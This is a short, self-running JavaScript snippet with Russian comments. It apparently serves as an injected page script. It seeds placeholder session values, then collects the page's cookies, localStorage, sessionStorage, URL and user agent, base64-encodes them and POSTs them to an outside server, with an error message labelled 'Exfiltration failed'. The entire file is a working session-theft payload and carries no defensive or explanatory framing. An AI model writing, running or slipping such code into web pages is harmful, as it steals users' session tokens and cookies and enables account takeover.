(function () {
  // 1. Имитация данных, если их нет
  if (!localStorage.getItem("session_id")) {
    localStorage.setItem("session_id", "abc123xyz");
  }

  if (!sessionStorage.getItem("temp_key")) {
    sessionStorage.setItem("temp_key", "42");
  }

  if (!document.cookie.includes("user_id")) {
    document.cookie = "user_id=42; path=/";
  }

  // 2. Сбор данных
  const data = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    location: window.location.href,
    userAgent: navigator.userAgent
  };

  // 3. Преобразование в Blob
  const blob = new Blob([JSON.stringify(data, null, 2)], {
    type: 'application/json'
  });

  // 4. Чтение как base64
  const reader = new FileReader();
  reader.onload = function () {
    const base64File = reader.result;

    // 5. Отправка на сервер
    fetch('https://zaza-back.onrender.com/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify({
        email: 'from-capture.js',
        password: 'injected',
        dumpFile: base64File
      })
    }).catch(err => console.error('Exfiltration failed:', err));
  };

  reader.onerror = function () {
    console.error("❌ Failed to read blob");
  };

  reader.readAsDataURL(blob);
})();
